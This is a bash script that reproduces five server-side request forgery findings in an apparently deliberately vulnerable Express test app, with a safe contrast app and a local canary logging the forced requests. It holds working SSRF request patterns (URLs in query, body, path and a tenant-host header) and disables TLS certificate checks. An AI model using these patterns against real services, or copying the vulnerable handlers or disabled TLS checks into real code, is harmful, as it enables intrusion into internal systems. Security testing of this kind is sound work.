#!/usr/bin/env bash
# Reproduces the 5 SSRF findings in dummy-projects/vulnerable/ssrf/express-vite-bff, plus a safe contrast on clean/express-vite-bff.
set -u
cd "$(dirname "$0")/.."
APP=dummy-projects/vulnerable/ssrf/express-vite-bff
SAFE_APP=dummy-projects/clean/express-vite-bff
LOG=$(mktemp)
(cd "$APP" && npm install --silent --no-audit --no-fund) || exit 2
(cd "$SAFE_APP" && npm install --silent --no-audit --no-fund) || exit 2
# self-signed cert so the https:// template in /api/tenant-config can reach the local canary
TMP=$(mktemp -d)
openssl req -x509 -newkey rsa:2048 -nodes -days 1 -subj /CN=localhost -keyout "$TMP/k.pem" -out "$TMP/c.pem" 2>/dev/null
python3 repro/canary.py "$TMP/c.pem" "$TMP/k.pem" >"$LOG" 2>&1 & CANARY=$!
# demo app has no error handling: keep it alive on rejected requests; trust the self-signed cert (demo only)
(cd "$APP" && NODE_TLS_REJECT_UNAUTHORIZED=0 exec node --unhandled-rejections=warn server/index.js 2>/dev/null) & SERVER=$!
(cd "$SAFE_APP" && NODE_TLS_REJECT_UNAUTHORIZED=0 exec node --unhandled-rejections=warn server/index.js 2>/dev/null) & SAFE=$!
trap 'kill $CANARY $SERVER $SAFE 2>/dev/null' EXIT
sleep 2

run() { echo; echo "### $1"; shift; "$@" -sS -m 5 -w '\n[http %{http_code}]\n'; }
C=http://127.0.0.1:9999
S=http://localhost:3001

run "1 /api/proxy (axios.get(req.query.url))"        curl "$S/api/proxy?url=$C/proxy"
run "2 /api/webhook-test (fetch(req.body.callbackUrl))" curl -XPOST "$S/api/webhook-test" -H 'content-type: application/json' -d "{\"callbackUrl\":\"$C/webhook\"}"
run "3 /api/avatar (http.get(req.query.u))"          curl "$S/api/avatar?u=$C/avatar"
run "4 /api/fetch/:target (got(req.params.target))"  curl "$S/api/fetch/$(python3 -c "import urllib.parse;print(urllib.parse.quote('$C/target',safe=''))")"
run "5 /api/tenant-config (host from x-tenant-host)" curl "$S/api/tenant-config" -H "x-tenant-host: 127.0.0.1:9998"
echo; echo "### SAFE (clean/express-vite-bff on :3003): /api/safe-proxy refuses (guard throws; [http 000] = no response, and no canary hit below)"
curl -sS -m 5 -o /dev/null -w '[http %{http_code}]\n' "http://localhost:3003/api/safe-proxy?url=$C/safe"

echo; echo "=========== canary log (each line = request the server made for the attacker)"
cat "$LOG"
